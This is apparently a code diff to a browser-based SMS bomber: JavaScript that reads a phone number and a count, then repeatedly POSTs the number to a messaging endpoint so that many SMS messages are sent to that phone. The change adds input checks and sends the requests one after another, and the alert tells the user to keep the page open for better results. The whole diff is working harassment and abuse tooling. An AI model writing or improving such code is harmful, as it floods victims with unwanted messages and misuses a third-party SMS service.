@@ -5,27 +5,44 @@ const headers = new Headers({
 
 function makeRequests() {
   const number = document.getElementById("phoneNumber").value;
-  const amount = document.getElementById("requestAmount").value;
+  const amount = parseInt(document.getElementById("requestAmount").value);
   const logElement = document.getElementById("requestsLog");
 
-  const data = new URLSearchParams();
-  data.append("phone", number);
+  if (isNaN(amount) || amount <= 0) {
+    logElement.innerHTML = "<p>Please enter a valid positive number for the amount.</p>";
+    return;
+  }
 
-  for (let i = 0; i < amount; i++) {
-    fetch(url, {
-      method: "POST",
-      headers: headers,
-      body: data,
-    })
-      .then((response) => response.text())
-      .then((responseData) => {
-        if (responseData.includes("Msg sent")) {
-          logElement.innerHTML += `<p> ${i + 1}: Msg sent successfully!</p>`;
-        } else {
-          logElement.innerHTML += `<p> ${i + 1}: Failed to send the message.</p>`;
-        }
+  logElement.innerHTML = ""; // Clear previous log
+
+  const sendData = async () => {
+    try {
+      const response = await fetch(url, {
+        method: "POST",
+        headers: headers,
+        body: new URLSearchParams({ "phone": number }),
       });
 
-    alert(`${amount} SMS Sending ${number} This number..For Good result keep the browser 3 minutes..`);
-  }
+      const responseData = await response.text();
+
+      if (responseData.includes("Msg sent")) {
+        logElement.innerHTML += `<p>Msg sent successfully!</p>`;
+      } else {
+        logElement.innerHTML += `<p>Failed to send the message.</p>`;
+      }
+    } catch (error) {
+      console.error("Error sending request:", error);
+      logElement.innerHTML += `<p>Error sending request.</p>`;
+    }
+  };
+
+  const sendRequestsSequentially = async () => {
+    for (let i = 0; i < amount; i++) {
+      await sendData();
+    }
+  };
+
+  alert(`${amount} SMS sending to ${number}. For good results, keep the browser open for a few minutes.`);
+
+  sendRequestsSequentially();
 }
